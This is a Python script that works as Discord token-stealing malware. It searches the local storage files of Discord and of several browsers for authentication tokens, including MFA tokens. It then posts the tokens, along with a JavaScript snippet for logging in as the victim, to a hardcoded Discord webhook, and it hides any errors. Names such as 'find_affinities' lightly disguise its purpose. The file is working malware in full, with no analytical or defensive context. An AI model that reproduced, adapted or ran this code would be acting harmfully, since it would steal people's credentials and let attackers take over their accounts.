import os
import re
import json

from urllib.request import Request, urlopen

# Discord webhook engine url
Engine = 'https://discord.com/api/webhooks/910272849862873098/SQqsSwVi1cC2U1uMTxSSGFGr6arawnbXxaMwPwZVFdF1FEwa90ykf9BNE6dN99iDYWlI'


def find_affinities(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        affinities = find_affinities(path)

        if len(affinities) > 0:
            for user in affinities:
                message += f'{user}\n'
                message += '```'
                message += '```js\n'
                message += f'let user = "{affinities[0]}";'
                message += 'function login(user){setInterval(() => {document.body.appendChild(document.createElement ' \
                        '`iframe`).contentWindow.localStorage.user = `"${user}"`}, 50);setTimeout(() => {' \
                               'location.reload();}, 2500);}login(user); '
                message += '```'
        else:
            message += 'No affinities found.\n'



    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 '
                      'Safari/537.11 '
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(Engine, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == '__main__':
    main()
